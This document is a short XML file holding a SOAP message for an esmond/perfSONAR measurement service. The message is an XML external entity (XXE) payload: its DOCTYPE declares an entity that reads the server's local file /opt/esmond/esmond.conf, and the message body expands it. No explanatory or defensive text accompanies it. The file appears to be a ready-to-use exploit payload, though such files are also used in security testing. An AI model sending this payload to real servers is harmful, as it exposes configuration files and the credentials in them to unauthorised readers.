oppd/esmond.xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [
   <!ENTITY xxe SYSTEM "file:///opt/esmond/esmond.conf" >
]>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
	<SOAP-ENV:Header/>
	<SOAP-ENV:Body>
		<nmwg:message xmlns:nmwg="http://ggf.org/ns/nmwg/base/2.0/">
			<nmwg:data>
				&xxe;
			</nmwg:data>
		</nmwg:message>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
